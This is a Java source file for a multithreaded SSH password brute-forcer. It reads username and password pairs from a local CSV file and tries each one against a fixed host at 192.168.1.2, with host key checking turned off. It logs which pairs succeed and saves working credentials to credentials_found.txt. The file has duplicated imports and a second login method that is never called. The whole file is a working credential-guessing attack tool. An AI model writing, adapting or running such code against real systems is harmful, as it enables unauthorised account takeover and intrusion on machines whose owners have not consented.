package maven;

import com.jcraft.jsch.*;
import com.opencsv.CSVReader;

import java.io.*;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import org.apache.sshd.client.SshClient;
import org.apache.sshd.client.future.AuthFuture;
import org.apache.sshd.client.future.ConnectFuture;
import org.apache.sshd.client.session.ClientSession;

import java.io.*;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class SSH {
	private static final int SSH_PORT = 22;
    private static final Duration CONNECT_TIMEOUT = Duration.ofSeconds(10);
    private static final Duration AUTH_TIMEOUT = Duration.ofSeconds(10);
    private static final int THREAD_POOL_SIZE = 8; // tune as needed
    private static final long BETWEEN_ATTEMPTS_MILLIS = 200;

	// SSH connection method
	public static void sshConnect(String host, String username, String password) {
		JSch jsch = new JSch();
		Session session = null;
		try {
			session = jsch.getSession(username, host, 22);
			session.setPassword(password);

			// Avoid asking for key confirmation
			session.setConfig("StrictHostKeyChecking", "no");

			// Connect with timeout
			session.connect(0);

			// If successful
			System.out.println("Username - " + username + " and Password - " + password + " found.");
			try (FileWriter fw = new FileWriter("credentials_found.txt", true);
					BufferedWriter bw = new BufferedWriter(fw);
					PrintWriter out = new PrintWriter(bw)) {
				out.println("Username: " + username);
				out.println("Password: " + password);
				out.println("Worked on host " + host);
			}
		} catch (JSchException e) {
			if (e.getMessage().toLowerCase().contains("auth fail")) {
				System.out.println("Username - " + username + " and Password - " + password + " is Incorrect.");
			} else if (e.getMessage().toLowerCase().contains("timeout")) {
				System.out.println("**** Attempting to connect - Rate limiting on server ****");
			} else {
				System.out.println("Connection error: " + e.getMessage());
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (session != null && session.isConnected()) {
				session.disconnect();
			}
		}
	}
	private static void tryCredential(SshClient client, String host, int port, String username, String password) {
        ClientSession session = null;
        try {
            // Connect
            ConnectFuture cf = client.connect(username, host, port);
            cf.verify(CONNECT_TIMEOUT.toMillis());
            session = cf.getSession();

            // Add password identity and try to authenticate
            session.addPasswordIdentity(password);

            AuthFuture auth = session.auth();
            boolean ok = auth.await(AUTH_TIMEOUT.toMillis(), TimeUnit.MILLISECONDS) && auth.isSuccess();

            if (ok) {
                String successMsg = String.format("Username - %s and Password - %s found.", username, password);
                System.out.println(successMsg);
              
            } else {
                System.out.printf("Username - %s and Password - %s is Incorrect.%n", username, password);
            }
        } catch (IOException e) {
            // Could be network issue, timeout, or server-side rate limiting symptom
            System.out.println("**** Attempting to connect - Rate limiting or network error: " + e.getMessage() + " ****");
        } catch (Exception e) {
            System.out.println("Connection error: " + e.getMessage());
        } finally {
            if (session != null) {
                try {
                    session.close(false).await(5, TimeUnit.SECONDS);
                } catch (Exception ignored) { }
            }
        }
    }

	// Main function
	public static void main(String[] args) throws Exception {
		ExecutorService executor = Executors.newFixedThreadPool(20);
		SshClient client = SshClient.setUpDefaultClient();
        client.start();
		File file = new File("/home/dkumar/Data/passwords.csv");
		FileReader fileReader = new FileReader(file);
		CSVReader csvReader = new CSVReader(fileReader);
		List<String[]> lines = csvReader.readAll();
		String host = "192.168.1.2";
		for (String[] line: lines) {
			String username = line[0];
			String password = line[1];
			
			executor.submit(() -> sshConnect(host, username, password));
		}
		csvReader.close();
	}
}
